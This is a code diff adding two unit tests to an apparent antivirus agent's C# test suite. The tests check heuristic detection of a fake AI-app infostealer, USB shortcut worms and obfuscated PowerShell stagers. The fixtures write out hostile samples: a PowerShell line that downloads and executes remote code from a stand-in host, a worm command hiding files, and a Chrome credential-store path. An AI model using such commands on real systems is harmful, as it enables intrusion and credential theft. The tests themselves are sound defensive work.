@@ -818,6 +818,111 @@ public sealed class AgentPhase7ATests
         }
     }
 
+    // 22. V1.0 Eco-Power Mode, Local Heuristic AI Risk Score (0–100) & Infostealer / Fake AI App Guard
+    [Fact]
+    public async Task Test22_EcoPowerMode_LocalAiRiskScore_And_FakeAiAppInfostealerGuard()
+    {
+        var perfGuard = new PerformanceProtectionGuard();
+        Assert.True(perfGuard.EcoPowerModeEnabled);
+        Assert.Equal(40, PerformanceProtectionGuard.EcoCpuThresholdPercent);
+        Assert.Contains("Eco-Mode Active", perfGuard.EcoStatusBadgeLabel);
+
+        perfGuard.SetEcoPowerMode(false);
+        Assert.False(perfGuard.EcoPowerModeEnabled);
+        perfGuard.SetEcoPowerMode(true);
+        Assert.True(perfGuard.EcoPowerModeEnabled);
+
+        var tempDir = Path.Combine(Path.GetTempPath(), "Kiron_FakeAiDownloads_" + Guid.NewGuid().ToString("N")[..6]);
+        Directory.CreateDirectory(tempDir);
+
+        try
+        {
+            var fakeAiPath = Path.Combine(tempDir, "chatgpt-pro-crack.exe");
+            // Unsigned MZ PE header + browser credential path indicator
+            var payload = Encoding.ASCII.GetBytes("MZ\x90\x00FakeAIAppPayload \\Google\\Chrome\\User Data\\Default\\Login Data");
+            await File.WriteAllBytesAsync(fakeAiPath, payload);
+
+            var heuristicEngine = new HeuristicSuspiciousFileEngine();
+            var finding = await heuristicEngine.InspectFileAsync(
+                fakeAiPath,
+                "0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef",
+                payload.Length,
+                CancellationToken.None);
+
+            Assert.NotNull(finding);
+            Assert.Contains("Heuristic.FakeAIApp.MasqueradeDropper", finding!.DetectionName);
+            Assert.InRange(finding.LocalAiRiskScore0To100, 75, 100);
+        }
+        finally
+        {
+            Directory.Delete(tempDir, recursive: true);
+        }
+    }
+
+    // 23. V1.0 Explorer Right-Click CLI (--scan-path), USB Shortcut Virus Recovery, Script/Startup Malware & Defender Offline Bridge
+    [Fact]
+    public async Task Test23_ExplorerContextMenuCli_UsbShortcutVirusRecovery_ScriptMalware_And_DefenderOfflineBridge()
+    {
+        // 1. CLI Right-Click Context Menu Parsing (--scan-path "E:\")
+        var (scanDrive, minFlag) = ModularScanPipeline.ParseCliScanPathArguments(
+            new[] { "--scan-path", "E:", "--minimized-tray" });
+        Assert.Equal($"E:{Path.DirectorySeparatorChar}", scanDrive);
+        Assert.True(minFlag);
+
+        // 2. Deep Rootkit Safety Bridge (Start-MpWDOScan)
+        var offlinePsi = WindowsSecurityMonitor.BuildDefenderOfflineScanStartInfo();
+        Assert.Equal("powershell.exe", offlinePsi.FileName);
+        Assert.Contains("Start-MpWDOScan", offlinePsi.ArgumentList);
+
+        var tempUsbDir = Path.Combine(Path.GetTempPath(), "Kiron_UsbRecovery_" + Guid.NewGuid().ToString("N")[..6]);
+        Directory.CreateDirectory(tempUsbDir);
+
+        try
+        {
+            // 3. Recover Hidden USB Folders (clears Hidden | System on user folder, skips System Volume Information)
+            var hiddenUserFolder = Path.Combine(tempUsbDir, "University_Photos");
+            var protectedSysFolder = Path.Combine(tempUsbDir, "System Volume Information");
+            Directory.CreateDirectory(hiddenUserFolder);
+            Directory.CreateDirectory(protectedSysFolder);
+
+            new DirectoryInfo(hiddenUserFolder).Attributes |= FileAttributes.Hidden | FileAttributes.System;
+            new DirectoryInfo(protectedSysFolder).Attributes |= FileAttributes.Hidden | FileAttributes.System;
+
+            var recovered = ModularScanPipeline.RecoverHiddenUsbFolders(tempUsbDir);
+            Assert.Single(recovered);
+            Assert.Equal(hiddenUserFolder, recovered[0]);
+            var updatedAttrs = new DirectoryInfo(hiddenUserFolder).Attributes;
+            Assert.Equal(0, (int)(updatedAttrs & (FileAttributes.Hidden | FileAttributes.System)));
+
+            // 4. USB Shortcut Worm (.lnk), Obfuscated Script (.ps1), and Startup Persistence (.bat) Detection
+            var heuristicEngine = new HeuristicSuspiciousFileEngine();
+
+            var shortcutWormPath = Path.Combine(tempUsbDir, "Photos.lnk");
+            var wormBytes = Encoding.ASCII.GetBytes("LNK_HEADER cmd.exe /c attrib +h +s & wscript.exe worm.vbs");
+            await File.WriteAllBytesAsync(shortcutWormPath, wormBytes);
+            var wormFinding = await heuristicEngine.InspectFileAsync(
+                shortcutWormPath,
+                "1111111111111111111111111111111111111111111111111111111111111111",
+                wormBytes.Length);
+            Assert.NotNull(wormFinding);
+            Assert.Equal("Heuristic.UsbWorm.ShortcutVirus", wormFinding!.DetectionName);
+
+            var scriptPath = Path.Combine(tempUsbDir, "stager.ps1");
+            var scriptBytes = Encoding.ASCII.GetBytes("powershell -EncodedCommand SQBFAFgA Invoke-Expression (New-Object Net.WebClient).DownloadString('http://bad')");
+            await File.WriteAllBytesAsync(scriptPath, scriptBytes);
+            var scriptFinding = await heuristicEngine.InspectFileAsync(
+                scriptPath,
+                "2222222222222222222222222222222222222222222222222222222222222222",
+                scriptBytes.Length);
+            Assert.NotNull(scriptFinding);
+            Assert.Equal("Heuristic.ScriptMalware.ObfuscatedCommand", scriptFinding!.DetectionName);
+        }
+        finally
+        {
+            Directory.Delete(tempUsbDir, recursive: true);
+        }
+    }
+
     private sealed class SynchronousProgress : IProgress<ScanProgressUpdate>
     {
         private readonly List<ScanProgressUpdate> _sink;
